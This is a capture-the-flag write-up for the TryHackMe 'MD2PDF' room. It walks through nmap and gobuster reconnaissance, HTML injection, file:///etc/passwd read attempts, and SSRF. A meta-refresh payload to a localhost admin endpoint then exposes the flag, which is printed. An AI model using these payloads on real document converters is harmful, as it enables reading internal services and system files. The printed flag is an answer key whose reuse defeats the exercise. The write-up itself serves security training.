# <div align="center">[MD2PDF](https://tryhackme.com/room/md2pdf)</div>
<div align="center">HTML Injection</div>
<br>
<div align="center">
  <img  height="200" alt="image" src="https://github.com/user-attachments/assets/ab126764-bcde-4f67-aaaa-e3529b10351d" />
</div>

# Task 1. Challenge

Hello Hacker!

TopTierConversions LTD is proud to announce its latest and greatest product launch: MD2PDF.

This easy-to-use utility converts markdown files to PDF and is totally secure! Right...?

> What is the flag?

First I ran nmap scan on the target ip address:
```bash
nmap -sS -sC 10.49.179.71
```
The scan revealed the following details:

```text
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-17 20:35 +0530
Nmap scan report for 10.49.179.71
Host is up (0.072s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   3072 92:74:a8:49:3c:9a:e0:b1:3d:b9:e5:bb:5f:71:34:bd (RSA)
|   256 47:99:94:6f:d0:7f:bc:1e:b6:5b:6f:fd:3a:cf:81:4d (ECDSA)
|_  256 d2:e4:1e:44:c7:9e:b9:a9:12:68:67:03:1e:0b:8b:26 (ED25519)
80/tcp   open  http
|_http-title: MD2PDF
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 36.33 seconds
```
This showed 3 services : ssh, http and an unknown service on port 5000
I first checked the http service by pasting the target ip on the browser which opened a plain Markdown → PDF converter website.
I used the command
```bash
curl -v http://10.49.179.71
```
to inspect the page. This showed the frontend sends markdown to: `POST /convert` which generates a PDF. This suggested the backend workflow: 
`Markdown → HTML → PDF`

I tested if raw HTML could be injected.

`<h1>HELLO</h1>`

The generated PDF displayed HELLO, confirming that **HTML injection** is possible.

Next I tried common PDF renderer LFI(Local File Inclusion) payloads like : 
- `<img src="file:///etc/passwd">`
- `![](file:///etc/passwd)`

All lead to :
` Bad Request – Something went wrong generating the PDF`

I also tried alternative tags:

- `<iframe src="file:///etc/passwd">`
- `<object data="file:///etc/passwd">`

These also failed.

Then I tested if the renderer could make network requests using : `<img src="http://10.49.179.71">`

The PDF generated successfully (but blank), meaning the backend attempted to fetch the URL.
This confirmed **SSRF capability**.

I also tried accessing the unknown service shown by the nmap scan at port 5000 at url `http://10.49.179.71:5000` it gave the same on port 80
but when i tried `<iframe src="http://127.0.0.1:5000"></iframe>` This worked, confirming the renderer can access localhost services.

I then enumerated the web server using:

```bash
gobuster dir -u http://10.49.179.71 -w /usr/share/wordlists/dirb/common.txt
```
I found:
```text
admin                (Status: 403) [Size: 166]
```
showing that there is an /admin endpoint but access is forbidden(403).

Since HTML injection worked, I tested JavaScript.
`<script>document.body.innerHTML="JS WORKS"; </script>`

The PDF displayed JS WORKS, confirming, JavaScript execution in the renderer.

However attempts to use JS to fetch internal pages returned blank pages due to rendering timing.

Finally, I leveraged HTML injection to redirect the renderer to the internal admin endpoint using a meta refresh:

`<meta http-equiv="refresh" content="0;url=http://127.0.0.1:5000/admin">`

The PDF was generated successfully and revealed the flag.

Answer:

```
flag{1f4a2b6ffeaf4707c43885d704eaee4b}
```

## 🧠 Summary

- HTML injection in PDF rendering  
- server-side request capability confirmed  
- accessed internal service on localhost  
- bypassed restricted `/admin` endpoint  
- retrieved flag via internal endpoint exposure  
